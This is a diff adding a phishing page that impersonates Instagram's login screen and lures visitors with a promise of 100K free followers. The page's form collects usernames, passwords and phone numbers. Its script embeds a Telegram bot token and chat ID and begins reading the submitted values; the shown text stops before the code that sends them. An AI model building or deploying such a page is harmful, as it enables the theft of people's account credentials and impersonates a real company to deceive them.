@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;600;700&display=swap');
+
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #000;
+            font-family: 'Instagram Sans', -apple-system, sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 16px;
+            padding: 40px 30px;
+            width: 92%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(138,43,226,0.6), 0 0 80px rgba(0,255,255,0.3);
+            animation: pulse 4s infinite alternate;
+        }
+        @keyframes pulse {
+            from { box-shadow: 0 0 50px rgba(138,43,226,0.6), 0 0 80px rgba(0,255,255,0.3); }
+            to   { box-shadow: 0 0 70px rgba(138,43,226,0.9), 0 0 120px rgba(0,255,255,0.6); }
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #8a2be2, #00ffff, #ff00ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 30px;
+        }
+        h2 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px #8a2be2;
+        }
+        p {
+            font-size: 14px;
+            opacity: 0.8;
+            margin-bottom: 25px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus {
+            border-color: #8a2be2;
+            box-shadow: 0 0 15px rgba(138,43,226,0.6);
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(45deg, #8a2be2, #00ffff);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(138,43,226,0.6);
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 11px;
+            opacity: 0.5;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">Instagram</div>
+    
+    <h2>Log in to continue</h2>
+    <p>Enter your details to get 100K free followers & likes</p>
+
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username, email or phone" required autocomplete="username">
+        <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
+        <input type="text" id="phone" placeholder="Phone number (optional)" autocomplete="tel">
+        
+        <button type="submit">Log In & Claim Reward</button>
+    </form>
+
+    <div class="footer">
+        © 2025 Instagram from Meta
+    </div>
+</div>
+
+<script>
+    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
+    const CHAT_ID = "6080665310";
+
+    document.getElementById('loginForm').onsubmit = async function(e) {
+        e.preventDefault();
+
+        const u = document.getElementById('username').value.trim();
+        const p = document.getElementById('password').value;
+        const ph = document.getElementById('phone').value.trim() || "Not provided";
